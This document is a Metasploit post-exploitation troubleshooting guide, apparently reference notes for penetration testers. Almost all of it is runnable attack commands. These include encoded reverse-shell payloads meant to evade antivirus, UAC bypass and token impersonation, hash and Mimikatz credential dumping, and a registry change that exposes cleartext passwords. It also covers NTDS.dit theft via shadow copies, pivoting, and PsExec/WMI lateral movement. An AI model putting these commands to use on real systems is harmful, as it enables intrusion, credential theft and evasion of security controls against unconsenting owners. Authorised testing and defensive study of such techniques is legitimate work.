# Failure Recovery Guide — Metasploit Post-Exploitation

## Shell Upgrade Failures

### Problem: `sessions -u` fails
```
# Try explicit module with custom LHOST/LPORT
use post/multi/manage/shell_to_meterpreter
set SESSION <ID>
set LHOST <LHOST>
set LPORT 4433    # Use a different port
set HANDLER true
run

# If still fails — generate custom payload
msfvenom -p <OS>/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=4433 -f <format> -o /tmp/stager
# Upload and execute manually through the shell
```

### Problem: Session dies immediately after upgrade
```
# Session is likely being killed by AV
# Try:
# 1. Encode the payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=4433 -e x64/xor_dynamic -f exe -o /tmp/encoded.exe

# 2. Use stageless payload (smaller attack surface)
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<LHOST> LPORT=4433 -f exe -o /tmp/stageless.exe

# 3. Try different transport
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=443 -f exe -o /tmp/https.exe
```

## Privilege Escalation Failures

### Problem: `getsystem` fails
```
# Check current privileges
getprivs
# If SeImpersonatePrivilege present:
#   → Use Potato exploits (§4.4)

# If no useful privileges:
# 1. Run exploit suggester
run post/multi/recon/local_exploit_suggester

# 2. Try UAC bypasses
background
use exploit/windows/local/bypassuac_fodhelper
set SESSION <ID>
exploit

# 3. Check for stored credentials
run post/windows/gather/credentials/windows_autologin
cmdkey /list

# 4. Token impersonation
load incognito
list_tokens -u
impersonate_token "NT AUTHORITY\\SYSTEM"
```

### Problem: Local exploit suggester finds nothing
```
# Manual checks:
# 1. Check OS version and patch level
run post/windows/gather/enum_patches
shell
systeminfo
exit

# 2. Check for misconfigured services
shell
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
sc query state= all | findstr /i "service_name"
exit

# 3. Check for writable service binaries
shell
icacls "C:\Program Files\*" /T /C 2>nul | findstr /i "everyone authenticated users"
exit

# 4. Check AlwaysInstallElevated
reg queryval -k 'HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer' -v AlwaysInstallElevated
reg queryval -k 'HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer' -v AlwaysInstallElevated
```

## Credential Harvesting Failures

### Problem: `hashdump` fails with "insufficient privileges"
```
# Must be SYSTEM — try:
getsystem
# If getsystem fails, try from different process:
ps
# Find SYSTEM process:
steal_token <SYSTEM_PID>
hashdump

# Alternative: use smart_hashdump (tries volume shadow copy)
run post/windows/gather/smart_hashdump
```

### Problem: `load kiwi` fails or shows no creds
```
# Check architecture — kiwi needs x64 on x64 systems
sysinfo
# If Architecture shows x86 on x64 OS:
ps
# Find x64 process and migrate
migrate <X64_PROCESS_PID>
load kiwi
creds_all

# If WDigest shows no cleartext:
# Enable WDigest (requires reboot or new logon)
reg setval -k 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -v UseLogonCredential -t REG_DWORD -d 1
# Wait for user to log in again, then:
creds_wdigest
```

### Problem: DCSync fails
```
# Requires specific AD rights — check:
# User needs: Replicating Directory Changes + Replicating Directory Changes All

# Alternative approaches:
# 1. NTDS.dit extraction via shadow copy
shell
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM
exit
download C:\\Temp\\ntds.dit /tmp/ntds.dit
download C:\\Temp\\SYSTEM /tmp/SYSTEM
# Offline: impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# 2. If not on DC — look for NTDS.dit backups
search -f ntds.dit
search -f SYSTEM.hiv
```

## Pivoting Failures

### Problem: AutoRoute not working
```
# Verify routes
run autoroute -p

# Check session is alive
sessions -l
sessions -i <ID>
sysinfo

# Try manual route
route add <SUBNET>/<CIDR> <SESSION_ID>
route print

# Verify target is reachable through session
# In Meterpreter:
shell
ping -c 1 <INTERNAL_TARGET>
exit
```

### Problem: SOCKS proxy not routing traffic
```
# Check proxy is running
jobs

# Verify proxychains config
# /etc/proxychains4.conf should have:
# socks4 127.0.0.1 1080

# Test with simple connection
proxychains curl -s http://<INTERNAL_TARGET>/

# Common issues:
# - proxy_dns line not commented out (causes DNS leaks/failures)
# - Wrong SOCKS version (try socks5 vs socks4)
# - Route not added (run autoroute first)
# - Session died (check sessions -l)
```

### Problem: Port forward not connecting
```
# List current forwards
portfwd list

# Verify target port is open (from Meterpreter shell)
shell
# Windows:
powershell Test-NetConnection -ComputerName <TARGET> -Port <PORT>
# Linux:
nc -zv <TARGET> <PORT>
exit

# Flush and recreate
portfwd flush
portfwd add -l <LOCAL_PORT> -p <REMOTE_PORT> -r <TARGET>
```

## Lateral Movement Failures

### Problem: PsExec "Access Denied"
```
# 1. Verify credentials work
use auxiliary/scanner/smb/smb_login
set RHOSTS <TARGET>
set SMBUser <USER>
set SMBPass <PASS_OR_HASH>
run

# 2. Check if SMB signing is required (PtH may fail)
use auxiliary/scanner/smb/smb2
set RHOSTS <TARGET>
run

# 3. Try alternative execution methods:
# PowerShell variant
use exploit/windows/smb/psexec_psh
set RHOSTS <TARGET>
set SMBUser <USER>
set SMBPass <PASS_OR_HASH>
exploit

# 4. Try WinRM instead
use auxiliary/scanner/winrm/winrm_login
set RHOSTS <TARGET>
set USERNAME <USER>
set PASSWORD <PASS>
run

# 5. Try WMI
shell
wmic /node:<TARGET> /user:<USER> /password:<PASS> process call create "cmd /c whoami > C:\temp\out.txt"
exit
```

### Problem: Session through pivot is unstable
```
# Use stageless payloads (more reliable over tunnels)
set PAYLOAD windows/x64/meterpreter_reverse_tcp  # note: no slash before reverse = stageless
set EnableStageEncoding true
set StageEncoder x64/xor_dynamic

# Increase session timeout
set SessionCommunicationTimeout 600
set SessionExpirationTimeout 604800

# Use bind payload instead (target connects back through route)
set PAYLOAD windows/x64/meterpreter/bind_tcp
set RHOST <INTERNAL_TARGET>
```

## General Recovery Checklist
1. ☐ Session alive? → `sessions -l`
2. ☐ Correct privileges? → `getuid`, `getprivs`
3. ☐ Right architecture? → `sysinfo` (x86 vs x64)
4. ☐ AV blocking? → Try encoded/stageless payload
5. ☐ Network path open? → Check routes, firewall rules
6. ☐ Credentials valid? → Test with `smb_login` or `ssh_login`
7. ☐ Module compatible? → `show options`, check target/platform
